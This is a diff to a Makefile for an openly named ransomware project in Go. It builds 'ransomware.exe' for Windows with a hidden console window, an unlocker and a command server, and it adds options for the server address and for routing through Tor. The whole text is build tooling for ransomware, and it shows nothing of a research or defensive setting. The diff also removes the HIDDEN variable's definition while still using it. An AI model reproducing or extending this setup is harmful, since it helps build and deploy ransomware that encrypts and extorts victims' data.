@@ -5,12 +5,11 @@ all: build clean
 PROJECT_DIR=$(shell pwd)
 BUILD_DIR=$(PROJECT_DIR)/build
 BIN_DIR=$(PROJECT_DIR)/bin
-SERVER_HOST=localhost
-SERVER_PORT=8080
-SERVER_URL=https://$(SERVER_HOST):$(SERVER_PORT)
-HIDDEN=-H windowsgui
-R_LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL)
-S_LINKER_VARS=-X main.DefaultAddress=$(SERVER_HOST):$(SERVER_PORT)
+SERVER_HOST?=localhost
+SERVER_PORT?=8080
+SERVER_URL=http://$(SERVER_HOST):$(SERVER_PORT)
+
+LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL) -X main.UseTor=$(USE_TOR)
 
 deps:
 	go get -v github.com/Masterminds/glide
@@ -30,9 +29,9 @@ pre-build: clean-bin
 	mkdir -p $(BIN_DIR)/server
 
 build: pre-build
-	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(R_LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
+	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
 	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
-	cd $(BUILD_DIR)/server && go build --ldflags "-s -w $(S_LINKER_VARS)" && mv `ls|grep -v 'server.go'` $(BIN_DIR)/server
+	cd $(BUILD_DIR)/server && go build --ldflags "-s -w" && mv `ls|grep -v 'server.go'` $(BIN_DIR)/server
 
 clean:
 	rm -r $(BUILD_DIR) || true
